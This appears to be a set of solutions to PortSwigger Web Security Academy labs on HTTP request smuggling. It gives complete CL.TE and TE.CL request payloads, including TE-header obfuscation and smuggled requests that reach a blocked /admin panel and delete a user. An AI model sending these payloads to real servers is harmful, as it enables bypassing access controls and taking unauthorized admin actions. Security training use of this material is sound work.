<!-- omit in toc -->
# HTTP Request Smuggling

<!-- omit in toc -->
## Table of Contents

- [HTTP request smuggling, basic CL.TE vulnerability](#http-request-smuggling-basic-clte-vulnerability)
- [HTTP request smuggling, basic TE.CL vulnerability](#http-request-smuggling-basic-tecl-vulnerability)
- [HTTP request smuggling, obfuscating the TE header](#http-request-smuggling-obfuscating-the-te-header)
- [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](#http-request-smuggling-confirming-a-clte-vulnerability-via-differential-responses)
- [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](#http-request-smuggling-confirming-a-tecl-vulnerability-via-differential-responses)
- [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-clte-vulnerability)
- [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-tecl-vulnerability)

## HTTP request smuggling, basic CL.TE vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

<!-- omit in toc -->
### Quick Solution
As said in the title this website is vulnerable to a simple CL.TE vulnerability. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
The second response should say: ``Unrecognized method GPOST``.


## HTTP request smuggling, basic TE.CL vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

<!-- omit in toc -->
### Quick Solution
As said in the title this website is vulnerable to a simple TE.CL vulnerability. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
The second response should say: ``Unrecognized method GPOST``.

## HTTP request smuggling, obfuscating the TE header
Reference: https://ac971f131f8e9498c0a86f1d00cd0030.web-security-academy.net/

<!-- omit in toc -->
### Quick Solution
In this case the TE header had to be obfuscated. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
The second response should say: ``Unrecognized method GPOST``. 

## HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
Reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses

<!-- omit in toc -->
### Quick Solution
In this case the CL.TE vulnerability must be exploited via differential response. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```
The second request should receive an HTTP 404 response.

## HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

<!-- omit in toc -->
### Quick Solution
In this case the TE.CL vulnerability must be exploited via differential response. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
The second request should receive an HTTP 404 response.

## Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

<!-- omit in toc -->
### Quick Solution
This lab is divided in two parts. In the first part the goal is to access the ``/admin`` page, in the second part the goal is to delete a user. So two different requests must be sent. Payloads in the next paragraph.

<!-- omit in toc -->
### Solution
1. Try to visit ``/admin`` and observe that the request is blocked.
2. Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```
3. Observe that the merged request to ``/admin`` was rejected due to not using the header ``Host: localhost``.
4. Issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```
5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
7. Observe that you can now access the admin panel.
8. Using the previous response as a reference, change the smuggled request URL to delete the user ``carlos``:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

## Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl

<!-- omit in toc -->
### Quick Solution
This lab is divided in two parts. In the first part the goal is to access the ``/admin`` page, in the second part the goal is to delete a user. So two different requests must be sent. Payloads in the next paragraph.

<!-- omit in toc -->
### Solution
1. Try to visit ``/admin`` and observe that the request is blocked.
2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
3. Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
4. Observe that the merged request to ``/admin`` was rejected due to not using the header ``Host: localhost``.
5. Issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
6. Observe that you can now access the admin panel.
7. Using the previous response as a reference, change the smuggled request URL to delete the user ``carlos``:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```